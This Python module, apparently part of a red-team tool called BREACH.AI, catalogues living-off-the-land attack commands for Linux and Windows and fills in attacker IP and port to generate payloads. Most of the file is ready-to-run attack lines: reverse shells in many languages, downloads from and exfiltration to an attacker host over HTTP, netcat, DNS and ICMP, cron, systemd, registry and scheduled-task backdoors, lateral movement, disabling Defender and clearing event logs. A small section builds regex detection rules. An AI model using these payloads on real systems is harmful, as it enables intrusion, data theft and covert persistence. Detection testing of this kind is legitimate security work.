"""
BREACH.AI - Living Off The Land (LOLBins/LOLBas)

Attack simulation using built-in system tools.
Tests if security controls detect abuse of legitimate binaries.

Based on:
- GTFOBins (Linux): https://gtfobins.github.io/
- LOLBAS Project (Windows): https://lolbas-project.github.io/
"""

from dataclasses import dataclass, field
from typing import Optional
from enum import Enum


class LOLCategory(Enum):
    """Categories of LOL techniques."""
    FILE_READ = "file_read"
    FILE_WRITE = "file_write"
    FILE_DOWNLOAD = "file_download"
    FILE_UPLOAD = "file_upload"
    COMMAND_EXEC = "command_exec"
    REVERSE_SHELL = "reverse_shell"
    PERSISTENCE = "persistence"
    RECON = "recon"
    PRIV_ESC = "priv_esc"
    LATERAL = "lateral"
    DEFENSE_EVASION = "defense_evasion"


class OSType(Enum):
    LINUX = "linux"
    WINDOWS = "windows"
    MACOS = "macos"


@dataclass
class LOLTechnique:
    """A Living Off The Land technique."""
    name: str
    binary: str
    category: LOLCategory
    os_type: OSType
    command: str
    description: str
    detection_risk: str = "low"
    requires_sudo: bool = False
    mitre_id: Optional[str] = None


@dataclass
class LOLPayload:
    """A generated LOL payload."""
    technique: LOLTechnique
    payload: str
    target: Optional[str] = None
    parameters: dict = field(default_factory=dict)


class LivingOffTheLand:
    """
    Living Off The Land attack simulation.

    Generates payloads using built-in system tools to test
    if EDR/security controls detect their abuse.
    """

    def __init__(self):
        self.linux_techniques = self._load_linux_techniques()
        self.windows_techniques = self._load_windows_techniques()

    def get_techniques_by_category(
        self,
        category: LOLCategory,
        os_type: OSType
    ) -> list[LOLTechnique]:
        """Get techniques by category and OS."""
        techniques = (
            self.linux_techniques if os_type == OSType.LINUX
            else self.windows_techniques
        )
        return [t for t in techniques if t.category == category]

    def get_file_read_techniques(self, os_type: OSType) -> list[LOLTechnique]:
        """Get file read techniques."""
        return self.get_techniques_by_category(LOLCategory.FILE_READ, os_type)

    def get_reverse_shell_techniques(self, os_type: OSType) -> list[LOLTechnique]:
        """Get reverse shell techniques."""
        return self.get_techniques_by_category(LOLCategory.REVERSE_SHELL, os_type)

    def get_download_techniques(self, os_type: OSType) -> list[LOLTechnique]:
        """Get file download techniques."""
        return self.get_techniques_by_category(LOLCategory.FILE_DOWNLOAD, os_type)

    def get_persistence_techniques(self, os_type: OSType) -> list[LOLTechnique]:
        """Get persistence techniques."""
        return self.get_techniques_by_category(LOLCategory.PERSISTENCE, os_type)

    def get_all_techniques(self, os_type: OSType) -> list[LOLTechnique]:
        """Get all techniques for an OS."""
        if os_type == OSType.LINUX:
            return self.linux_techniques
        elif os_type == OSType.WINDOWS:
            return self.windows_techniques
        return []

    def generate_payload(
        self,
        technique: LOLTechnique,
        attacker_ip: str = "ATTACKER_IP",
        attacker_port: str = "4444",
        target_file: str = "/etc/passwd",
        output_file: str = "/tmp/output",
    ) -> LOLPayload:
        """Generate a payload for a specific technique."""
        payload = technique.command
        payload = payload.replace("{ATTACKER_IP}", attacker_ip)
        payload = payload.replace("{ATTACKER_PORT}", attacker_port)
        payload = payload.replace("{TARGET_FILE}", target_file)
        payload = payload.replace("{OUTPUT_FILE}", output_file)

        return LOLPayload(
            technique=technique,
            payload=payload,
            parameters={
                "attacker_ip": attacker_ip,
                "attacker_port": attacker_port,
                "target_file": target_file,
                "output_file": output_file,
            }
        )

    def generate_detection_rules(self, os_type: OSType) -> list[dict]:
        """Generate detection rules for LOL techniques."""
        rules = []
        techniques = self.get_all_techniques(os_type)

        for tech in techniques:
            rule = {
                "name": f"LOL_{tech.binary}_{tech.category.value}",
                "description": f"Detect {tech.binary} abuse for {tech.category.value}",
                "binary": tech.binary,
                "category": tech.category.value,
                "mitre_id": tech.mitre_id,
                "detection_patterns": self._get_detection_patterns(tech),
                "severity": "high" if tech.category in [
                    LOLCategory.REVERSE_SHELL,
                    LOLCategory.PERSISTENCE,
                    LOLCategory.PRIV_ESC
                ] else "medium",
            }
            rules.append(rule)

        return rules

    def _get_detection_patterns(self, technique: LOLTechnique) -> list[str]:
        """Get detection patterns for a technique."""
        patterns = []

        # Common suspicious patterns by binary
        binary_patterns = {
            "curl": [
                r"curl.*file://",
                r"curl.*-o.*http",
                r"curl.*POST.*@",
            ],
            "wget": [
                r"wget.*-O",
                r"wget.*--post-data",
            ],
            "nc": [
                r"nc.*-e",
                r"nc.*-c",
                r"mkfifo.*nc",
            ],
            "python": [
                r"python.*socket",
                r"python.*subprocess",
                r"python.*pty\.spawn",
            ],
            "bash": [
                r"bash.*-i.*>.*tcp",
                r"bash.*-c.*curl",
                r"bash.*-c.*wget",
            ],
            "certutil": [
                r"certutil.*-urlcache",
                r"certutil.*-decode",
            ],
            "powershell": [
                r"powershell.*-nop",
                r"powershell.*-enc",
                r"powershell.*downloadstring",
                r"powershell.*Net\.WebClient",
            ],
            "mshta": [
                r"mshta.*vbscript",
                r"mshta.*javascript",
            ],
            "wmic": [
                r"wmic.*process.*call.*create",
            ],
        }

        if technique.binary in binary_patterns:
            patterns.extend(binary_patterns[technique.binary])

        return patterns

    def _load_linux_techniques(self) -> list[LOLTechnique]:
        """Load Linux LOLBin techniques (GTFOBins)."""
        return [
            # === FILE READ ===
            LOLTechnique(
                name="cat_file_read",
                binary="cat",
                category=LOLCategory.FILE_READ,
                os_type=OSType.LINUX,
                command="cat {TARGET_FILE}",
                description="Read files using cat",
                detection_risk="low",
            ),
            LOLTechnique(
                name="base64_file_read",
                binary="base64",
                category=LOLCategory.FILE_READ,
                os_type=OSType.LINUX,
                command="base64 {TARGET_FILE} | base64 -d",
                description="Read files via base64 encoding (bypasses some filters)",
                detection_risk="low",
            ),
            LOLTechnique(
                name="curl_file_read",
                binary="curl",
                category=LOLCategory.FILE_READ,
                os_type=OSType.LINUX,
                command="curl file://{TARGET_FILE}",
                description="Read local files using curl file:// protocol",
                detection_risk="low",
            ),
            LOLTechnique(
                name="awk_file_read",
                binary="awk",
                category=LOLCategory.FILE_READ,
                os_type=OSType.LINUX,
                command="awk '{{print}}' {TARGET_FILE}",
                description="Read files using awk",
                detection_risk="low",
            ),
            LOLTechnique(
                name="sed_file_read",
                binary="sed",
                category=LOLCategory.FILE_READ,
                os_type=OSType.LINUX,
                command="sed '' {TARGET_FILE}",
                description="Read files using sed",
                detection_risk="low",
            ),
            LOLTechnique(
                name="xxd_file_read",
                binary="xxd",
                category=LOLCategory.FILE_READ,
                os_type=OSType.LINUX,
                command="xxd {TARGET_FILE} | xxd -r",
                description="Read files via hex dump",
                detection_risk="low",
            ),
            LOLTechnique(
                name="head_file_read",
                binary="head",
                category=LOLCategory.FILE_READ,
                os_type=OSType.LINUX,
                command="head -c 1000000 {TARGET_FILE}",
                description="Read files using head",
                detection_risk="low",
            ),
            LOLTechnique(
                name="tail_file_read",
                binary="tail",
                category=LOLCategory.FILE_READ,
                os_type=OSType.LINUX,
                command="tail -c 1000000 {TARGET_FILE}",
                description="Read files using tail",
                detection_risk="low",
            ),
            LOLTechnique(
                name="diff_file_read",
                binary="diff",
                category=LOLCategory.FILE_READ,
                os_type=OSType.LINUX,
                command="diff --line-format=%L /dev/null {TARGET_FILE}",
                description="Read files using diff",
                detection_risk="low",
            ),

            # === FILE DOWNLOAD ===
            LOLTechnique(
                name="curl_download",
                binary="curl",
                category=LOLCategory.FILE_DOWNLOAD,
                os_type=OSType.LINUX,
                command="curl -o {OUTPUT_FILE} http://{ATTACKER_IP}:{ATTACKER_PORT}/payload",
                description="Download files using curl",
                detection_risk="medium",
                mitre_id="T1105",
            ),
            LOLTechnique(
                name="wget_download",
                binary="wget",
                category=LOLCategory.FILE_DOWNLOAD,
                os_type=OSType.LINUX,
                command="wget -O {OUTPUT_FILE} http://{ATTACKER_IP}:{ATTACKER_PORT}/payload",
                description="Download files using wget",
                detection_risk="medium",
                mitre_id="T1105",
            ),
            LOLTechnique(
                name="python_download",
                binary="python",
                category=LOLCategory.FILE_DOWNLOAD,
                os_type=OSType.LINUX,
                command="python3 -c \"import urllib.request; urllib.request.urlretrieve('http://{ATTACKER_IP}:{ATTACKER_PORT}/payload', '{OUTPUT_FILE}')\"",
                description="Download files using Python",
                detection_risk="medium",
                mitre_id="T1105",
            ),
            LOLTechnique(
                name="perl_download",
                binary="perl",
                category=LOLCategory.FILE_DOWNLOAD,
                os_type=OSType.LINUX,
                command="perl -e 'use LWP::Simple; getstore(\"http://{ATTACKER_IP}:{ATTACKER_PORT}/payload\", \"{OUTPUT_FILE}\")'",
                description="Download files using Perl",
                detection_risk="low",
                mitre_id="T1105",
            ),
            LOLTechnique(
                name="nc_download",
                binary="nc",
                category=LOLCategory.FILE_DOWNLOAD,
                os_type=OSType.LINUX,
                command="nc {ATTACKER_IP} {ATTACKER_PORT} > {OUTPUT_FILE}",
                description="Download files using netcat",
                detection_risk="high",
                mitre_id="T1105",
            ),
            LOLTechnique(
                name="scp_download",
                binary="scp",
                category=LOLCategory.FILE_DOWNLOAD,
                os_type=OSType.LINUX,
                command="scp {ATTACKER_IP}:{TARGET_FILE} {OUTPUT_FILE}",
                description="Download files using SCP",
                detection_risk="medium",
                mitre_id="T1105",
            ),

            # === REVERSE SHELL ===
            LOLTechnique(
                name="bash_reverse_shell",
                binary="bash",
                category=LOLCategory.REVERSE_SHELL,
                os_type=OSType.LINUX,
                command="bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1",
                description="Bash reverse shell via /dev/tcp",
                detection_risk="high",
                mitre_id="T1059.004",
            ),
            LOLTechnique(
                name="python_reverse_shell",
                binary="python",
                category=LOLCategory.REVERSE_SHELL,
                os_type=OSType.LINUX,
                command="python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ATTACKER_IP}\",{ATTACKER_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
                description="Python reverse shell",
                detection_risk="high",
                mitre_id="T1059.006",
            ),
            LOLTechnique(
                name="nc_reverse_shell",
                binary="nc",
                category=LOLCategory.REVERSE_SHELL,
                os_type=OSType.LINUX,
                command="nc -e /bin/sh {ATTACKER_IP} {ATTACKER_PORT}",
                description="Netcat reverse shell with -e flag",
                detection_risk="high",
                mitre_id="T1095",
            ),
            LOLTechnique(
                name="nc_reverse_shell_mkfifo",
                binary="nc",
                category=LOLCategory.REVERSE_SHELL,
                os_type=OSType.LINUX,
                command="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ATTACKER_IP} {ATTACKER_PORT} >/tmp/f",
                description="Netcat reverse shell without -e (works on most systems)",
                detection_risk="high",
                mitre_id="T1095",
            ),
            LOLTechnique(
                name="perl_reverse_shell",
                binary="perl",
                category=LOLCategory.REVERSE_SHELL,
                os_type=OSType.LINUX,
                command="perl -e 'use Socket;$i=\"{ATTACKER_IP}\";$p={ATTACKER_PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
                description="Perl reverse shell",
                detection_risk="medium",
                mitre_id="T1059",
            ),
            LOLTechnique(
                name="php_reverse_shell",
                binary="php",
                category=LOLCategory.REVERSE_SHELL,
                os_type=OSType.LINUX,
                command="php -r '$sock=fsockopen(\"{ATTACKER_IP}\",{ATTACKER_PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                description="PHP reverse shell",
                detection_risk="medium",
                mitre_id="T1059",
            ),
            LOLTechnique(
                name="ruby_reverse_shell",
                binary="ruby",
                category=LOLCategory.REVERSE_SHELL,
                os_type=OSType.LINUX,
                command="ruby -rsocket -e 'f=TCPSocket.open(\"{ATTACKER_IP}\",{ATTACKER_PORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
                description="Ruby reverse shell",
                detection_risk="medium",
                mitre_id="T1059",
            ),
            LOLTechnique(
                name="socat_reverse_shell",
                binary="socat",
                category=LOLCategory.REVERSE_SHELL,
                os_type=OSType.LINUX,
                command="socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ATTACKER_IP}:{ATTACKER_PORT}",
                description="Socat reverse shell with PTY",
                detection_risk="high",
                mitre_id="T1095",
            ),
            LOLTechnique(
                name="openssl_reverse_shell",
                binary="openssl",
                category=LOLCategory.REVERSE_SHELL,
                os_type=OSType.LINUX,
                command="mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ATTACKER_IP}:{ATTACKER_PORT} > /tmp/s; rm /tmp/s",
                description="OpenSSL encrypted reverse shell",
                detection_risk="medium",
                mitre_id="T1573",
            ),

            # === COMMAND EXECUTION ===
            LOLTechnique(
                name="find_exec",
                binary="find",
                category=LOLCategory.COMMAND_EXEC,
                os_type=OSType.LINUX,
                command="find . -exec /bin/sh -c 'id' \\;",
                description="Execute commands via find -exec",
                detection_risk="low",
                mitre_id="T1059.004",
            ),
            LOLTechnique(
                name="xargs_exec",
                binary="xargs",
                category=LOLCategory.COMMAND_EXEC,
                os_type=OSType.LINUX,
                command="echo 'id' | xargs -I{{}} sh -c '{{}}'",
                description="Execute commands via xargs",
                detection_risk="low",
                mitre_id="T1059.004",
            ),
            LOLTechnique(
                name="awk_exec",
                binary="awk",
                category=LOLCategory.COMMAND_EXEC,
                os_type=OSType.LINUX,
                command="awk 'BEGIN {{system(\"id\")}}'",
                description="Execute commands via awk system()",
                detection_risk="low",
                mitre_id="T1059.004",
            ),
            LOLTechnique(
                name="vim_exec",
                binary="vim",
                category=LOLCategory.COMMAND_EXEC,
                os_type=OSType.LINUX,
                command="vim -c ':!id' -c ':q!'",
                description="Execute commands via vim",
                detection_risk="low",
                mitre_id="T1059.004",
            ),
            LOLTechnique(
                name="tar_exec",
                binary="tar",
                category=LOLCategory.COMMAND_EXEC,
                os_type=OSType.LINUX,
                command="tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
                description="Execute commands via tar checkpoint",
                detection_risk="low",
                mitre_id="T1059.004",
            ),
            LOLTechnique(
                name="crontab_exec",
                binary="crontab",
                category=LOLCategory.COMMAND_EXEC,
                os_type=OSType.LINUX,
                command="echo '* * * * * /bin/sh -c \"id > /tmp/out\"' | crontab -",
                description="Execute commands via crontab",
                detection_risk="medium",
                mitre_id="T1053.003",
            ),

            # === DATA EXFILTRATION ===
            LOLTechnique(
                name="curl_exfil",
                binary="curl",
                category=LOLCategory.FILE_UPLOAD,
                os_type=OSType.LINUX,
                command="curl -X POST -d @{TARGET_FILE} http://{ATTACKER_IP}:{ATTACKER_PORT}/exfil",
                description="Exfiltrate data via HTTP POST",
                detection_risk="medium",
                mitre_id="T1048",
            ),
            LOLTechnique(
                name="nc_exfil",
                binary="nc",
                category=LOLCategory.FILE_UPLOAD,
                os_type=OSType.LINUX,
                command="cat {TARGET_FILE} | nc {ATTACKER_IP} {ATTACKER_PORT}",
                description="Exfiltrate data via netcat",
                detection_risk="high",
                mitre_id="T1048",
            ),
            LOLTechnique(
                name="dns_exfil",
                binary="dig",
                category=LOLCategory.FILE_UPLOAD,
                os_type=OSType.LINUX,
                command="cat {TARGET_FILE} | base64 -w 63 | while read line; do dig $line.exfil.attacker.com; done",
                description="Exfiltrate data via DNS queries",
                detection_risk="low",
                mitre_id="T1048.003",
            ),
            LOLTechnique(
                name="icmp_exfil",
                binary="ping",
                category=LOLCategory.FILE_UPLOAD,
                os_type=OSType.LINUX,
                command="cat {TARGET_FILE} | xxd -p | while read line; do ping -c 1 -p $line {ATTACKER_IP}; done",
                description="Exfiltrate data via ICMP",
                detection_risk="low",
                mitre_id="T1048",
            ),

            # === PERSISTENCE ===
            LOLTechnique(
                name="cron_persistence",
                binary="crontab",
                category=LOLCategory.PERSISTENCE,
                os_type=OSType.LINUX,
                command="(crontab -l 2>/dev/null; echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1\"') | crontab -",
                description="Establish persistence via cron job",
                detection_risk="medium",
                mitre_id="T1053.003",
            ),
            LOLTechnique(
                name="ssh_key_persistence",
                binary="ssh",
                category=LOLCategory.PERSISTENCE,
                os_type=OSType.LINUX,
                command="echo 'ATTACKER_SSH_PUBLIC_KEY' >> ~/.ssh/authorized_keys",
                description="Establish persistence via SSH key",
                detection_risk="low",
                mitre_id="T1098.004",
            ),
            LOLTechnique(
                name="bashrc_persistence",
                binary="bash",
                category=LOLCategory.PERSISTENCE,
                os_type=OSType.LINUX,
                command="echo 'bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1 &' >> ~/.bashrc",
                description="Establish persistence via .bashrc",
                detection_risk="medium",
                mitre_id="T1546.004",
            ),
            LOLTechnique(
                name="systemd_persistence",
                binary="systemctl",
                category=LOLCategory.PERSISTENCE,
                os_type=OSType.LINUX,
                command="echo '[Service]\nExecStart=/bin/bash -c \"bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1\"\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/backdoor.service && systemctl enable backdoor",
                description="Establish persistence via systemd service",
                detection_risk="medium",
                requires_sudo=True,
                mitre_id="T1543.002",
            ),

            # === RECONNAISSANCE ===
            LOLTechnique(
                name="system_enum",
                binary="bash",
                category=LOLCategory.RECON,
                os_type=OSType.LINUX,
                command="uname -a; id; cat /etc/passwd; cat /etc/shadow 2>/dev/null; ps aux; netstat -tulpn 2>/dev/null || ss -tulpn",
                description="Basic system enumeration",
                detection_risk="low",
                mitre_id="T1082",
            ),
            LOLTechnique(
                name="find_suid",
                binary="find",
                category=LOLCategory.PRIV_ESC,
                os_type=OSType.LINUX,
                command="find / -perm -4000 -type f 2>/dev/null",
                description="Find SUID binaries for privilege escalation",
                detection_risk="low",
                mitre_id="T1548.001",
            ),
            LOLTechnique(
                name="find_writable",
                binary="find",
                category=LOLCategory.RECON,
                os_type=OSType.LINUX,
                command="find / -writable -type d 2>/dev/null",
                description="Find world-writable directories",
                detection_risk="low",
                mitre_id="T1083",
            ),
            LOLTechnique(
                name="capability_enum",
                binary="getcap",
                category=LOLCategory.PRIV_ESC,
                os_type=OSType.LINUX,
                command="getcap -r / 2>/dev/null",
                description="Find binaries with capabilities",
                detection_risk="low",
                mitre_id="T1548",
            ),
        ]

    def _load_windows_techniques(self) -> list[LOLTechnique]:
        """Load Windows LOLBas techniques."""
        return [
            # === FILE DOWNLOAD ===
            LOLTechnique(
                name="certutil_download",
                binary="certutil.exe",
                category=LOLCategory.FILE_DOWNLOAD,
                os_type=OSType.WINDOWS,
                command="certutil.exe -urlcache -split -f http://{ATTACKER_IP}:{ATTACKER_PORT}/payload {OUTPUT_FILE}",
                description="Download files using certutil",
                detection_risk="medium",
                mitre_id="T1105",
            ),
            LOLTechnique(
                name="bitsadmin_download",
                binary="bitsadmin.exe",
                category=LOLCategory.FILE_DOWNLOAD,
                os_type=OSType.WINDOWS,
                command="bitsadmin /transfer job /download /priority high http://{ATTACKER_IP}:{ATTACKER_PORT}/payload {OUTPUT_FILE}",
                description="Download files using BITS",
                detection_risk="medium",
                mitre_id="T1105",
            ),
            LOLTechnique(
                name="powershell_download",
                binary="powershell.exe",
                category=LOLCategory.FILE_DOWNLOAD,
                os_type=OSType.WINDOWS,
                command="powershell -c \"(New-Object Net.WebClient).DownloadFile('http://{ATTACKER_IP}:{ATTACKER_PORT}/payload','{OUTPUT_FILE}')\"",
                description="Download files using PowerShell",
                detection_risk="high",
                mitre_id="T1105",
            ),
            LOLTechnique(
                name="curl_download_windows",
                binary="curl.exe",
                category=LOLCategory.FILE_DOWNLOAD,
                os_type=OSType.WINDOWS,
                command="curl.exe -o {OUTPUT_FILE} http://{ATTACKER_IP}:{ATTACKER_PORT}/payload",
                description="Download files using curl (Windows 10+)",
                detection_risk="medium",
                mitre_id="T1105",
            ),
            LOLTechnique(
                name="expand_download",
                binary="expand.exe",
                category=LOLCategory.FILE_DOWNLOAD,
                os_type=OSType.WINDOWS,
                command="expand \\\\{ATTACKER_IP}\\share\\payload.cab {OUTPUT_FILE}",
                description="Download via expand from UNC path",
                detection_risk="low",
                mitre_id="T1105",
            ),

            # === COMMAND EXECUTION ===
            LOLTechnique(
                name="mshta_exec",
                binary="mshta.exe",
                category=LOLCategory.COMMAND_EXEC,
                os_type=OSType.WINDOWS,
                command="mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"cmd /c whoami > {OUTPUT_FILE}\"\", 0:close\")",
                description="Execute commands via MSHTA",
                detection_risk="high",
                mitre_id="T1218.005",
            ),
            LOLTechnique(
                name="rundll32_exec",
                binary="rundll32.exe",
                category=LOLCategory.COMMAND_EXEC,
                os_type=OSType.WINDOWS,
                command="rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c whoami\")",
                description="Execute commands via rundll32",
                detection_risk="high",
                mitre_id="T1218.011",
            ),
            LOLTechnique(
                name="wmic_exec",
                binary="wmic.exe",
                category=LOLCategory.COMMAND_EXEC,
                os_type=OSType.WINDOWS,
                command="wmic process call create \"cmd.exe /c whoami > {OUTPUT_FILE}\"",
                description="Execute commands via WMIC",
                detection_risk="medium",
                mitre_id="T1047",
            ),
            LOLTechnique(
                name="forfiles_exec",
                binary="forfiles.exe",
                category=LOLCategory.COMMAND_EXEC,
                os_type=OSType.WINDOWS,
                command="forfiles /p c:\\windows\\system32 /m notepad.exe /c \"cmd /c whoami\"",
                description="Execute commands via forfiles",
                detection_risk="low",
                mitre_id="T1059.003",
            ),
            LOLTechnique(
                name="pcalua_exec",
                binary="pcalua.exe",
                category=LOLCategory.COMMAND_EXEC,
                os_type=OSType.WINDOWS,
                command="pcalua.exe -a cmd.exe -c \"whoami\"",
                description="Execute commands via Program Compatibility Assistant",
                detection_risk="low",
                mitre_id="T1218",
            ),
            LOLTechnique(
                name="cmstp_exec",
                binary="cmstp.exe",
                category=LOLCategory.COMMAND_EXEC,
                os_type=OSType.WINDOWS,
                command="cmstp.exe /ni /s {OUTPUT_FILE}.inf",
                description="Execute commands via CMSTP",
                detection_risk="medium",
                mitre_id="T1218.003",
            ),

            # === REVERSE SHELL ===
            LOLTechnique(
                name="powershell_reverse_shell",
                binary="powershell.exe",
                category=LOLCategory.REVERSE_SHELL,
                os_type=OSType.WINDOWS,
                command="powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ATTACKER_IP}',{ATTACKER_PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
                description="PowerShell reverse shell",
                detection_risk="high",
                mitre_id="T1059.001",
            ),
            LOLTechnique(
                name="powershell_reverse_shell_encoded",
                binary="powershell.exe",
                category=LOLCategory.REVERSE_SHELL,
                os_type=OSType.WINDOWS,
                command="powershell -nop -enc {BASE64_PAYLOAD}",
                description="PowerShell reverse shell (base64 encoded)",
                detection_risk="high",
                mitre_id="T1059.001",
            ),

            # === FILE READ ===
            LOLTechnique(
                name="type_file_read",
                binary="type",
                category=LOLCategory.FILE_READ,
                os_type=OSType.WINDOWS,
                command="type {TARGET_FILE}",
                description="Read files using type command",
                detection_risk="low",
            ),
            LOLTechnique(
                name="certutil_decode_read",
                binary="certutil.exe",
                category=LOLCategory.FILE_READ,
                os_type=OSType.WINDOWS,
                command="certutil.exe -encode {TARGET_FILE} output.b64 && type output.b64",
                description="Read files via base64 encoding",
                detection_risk="low",
            ),
            LOLTechnique(
                name="findstr_file_read",
                binary="findstr.exe",
                category=LOLCategory.FILE_READ,
                os_type=OSType.WINDOWS,
                command="findstr /v \"DOESNOTEXIST\" {TARGET_FILE}",
                description="Read files using findstr",
                detection_risk="low",
            ),

            # === PERSISTENCE ===
            LOLTechnique(
                name="registry_run_key",
                binary="reg.exe",
                category=LOLCategory.PERSISTENCE,
                os_type=OSType.WINDOWS,
                command="reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d \"{OUTPUT_FILE}\" /f",
                description="Establish persistence via registry run key",
                detection_risk="medium",
                mitre_id="T1547.001",
            ),
            LOLTechnique(
                name="schtasks_persistence",
                binary="schtasks.exe",
                category=LOLCategory.PERSISTENCE,
                os_type=OSType.WINDOWS,
                command="schtasks /create /tn \"Backdoor\" /tr \"{OUTPUT_FILE}\" /sc onlogon /ru System /f",
                description="Establish persistence via scheduled task",
                detection_risk="medium",
                mitre_id="T1053.005",
            ),
            LOLTechnique(
                name="wmi_persistence",
                binary="wmic.exe",
                category=LOLCategory.PERSISTENCE,
                os_type=OSType.WINDOWS,
                command="wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name=\"Backdoor\", EventNameSpace=\"root\\cimv2\", QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour=12\"",
                description="Establish persistence via WMI subscription",
                detection_risk="medium",
                mitre_id="T1546.003",
            ),

            # === RECONNAISSANCE ===
            LOLTechnique(
                name="system_enum_windows",
                binary="cmd.exe",
                category=LOLCategory.RECON,
                os_type=OSType.WINDOWS,
                command="systeminfo && whoami /all && net user && net localgroup administrators && netstat -ano && ipconfig /all",
                description="Basic Windows system enumeration",
                detection_risk="low",
                mitre_id="T1082",
            ),
            LOLTechnique(
                name="domain_enum",
                binary="net.exe",
                category=LOLCategory.RECON,
                os_type=OSType.WINDOWS,
                command="net view /domain && net group \"Domain Admins\" /domain && net group \"Enterprise Admins\" /domain",
                description="Active Directory enumeration",
                detection_risk="medium",
                mitre_id="T1087.002",
            ),

            # === LATERAL MOVEMENT ===
            LOLTechnique(
                name="wmic_lateral",
                binary="wmic.exe",
                category=LOLCategory.LATERAL,
                os_type=OSType.WINDOWS,
                command="wmic /node:{TARGET} process call create \"cmd.exe /c whoami > C:\\temp\\out.txt\"",
                description="Lateral movement via WMIC",
                detection_risk="high",
                mitre_id="T1047",
            ),
            LOLTechnique(
                name="psexec_lateral",
                binary="psexec.exe",
                category=LOLCategory.LATERAL,
                os_type=OSType.WINDOWS,
                command="psexec.exe \\\\{TARGET} -s cmd.exe",
                description="Lateral movement via PsExec",
                detection_risk="high",
                mitre_id="T1569.002",
            ),
            LOLTechnique(
                name="winrm_lateral",
                binary="winrm.cmd",
                category=LOLCategory.LATERAL,
                os_type=OSType.WINDOWS,
                command="winrm invoke Create wmicimv2/Win32_Process @{{CommandLine=\"cmd.exe /c whoami\"}} -r:{TARGET}",
                description="Lateral movement via WinRM",
                detection_risk="medium",
                mitre_id="T1021.006",
            ),

            # === DEFENSE EVASION ===
            LOLTechnique(
                name="disable_defender",
                binary="powershell.exe",
                category=LOLCategory.DEFENSE_EVASION,
                os_type=OSType.WINDOWS,
                command="powershell -c \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
                description="Disable Windows Defender real-time monitoring",
                detection_risk="high",
                requires_sudo=True,
                mitre_id="T1562.001",
            ),
            LOLTechnique(
                name="clear_event_logs",
                binary="wevtutil.exe",
                category=LOLCategory.DEFENSE_EVASION,
                os_type=OSType.WINDOWS,
                command="wevtutil cl Security && wevtutil cl System && wevtutil cl Application",
                description="Clear Windows event logs",
                detection_risk="high",
                requires_sudo=True,
                mitre_id="T1070.001",
            ),
        ]


# Convenience functions
def get_linux_techniques() -> list[LOLTechnique]:
    """Get all Linux LOL techniques."""
    lol = LivingOffTheLand()
    return lol.linux_techniques


def get_windows_techniques() -> list[LOLTechnique]:
    """Get all Windows LOL techniques."""
    lol = LivingOffTheLand()
    return lol.windows_techniques


def generate_reverse_shells(
    os_type: OSType,
    attacker_ip: str,
    attacker_port: str = "4444",
) -> list[LOLPayload]:
    """Generate all reverse shell payloads for an OS."""
    lol = LivingOffTheLand()
    techniques = lol.get_reverse_shell_techniques(os_type)

    payloads = []
    for tech in techniques:
        payload = lol.generate_payload(
            technique=tech,
            attacker_ip=attacker_ip,
            attacker_port=attacker_port,
        )
        payloads.append(payload)

    return payloads


def generate_detection_rules(os_type: OSType) -> list[dict]:
    """Generate detection rules for LOL techniques."""
    lol = LivingOffTheLand()
    return lol.generate_detection_rules(os_type)
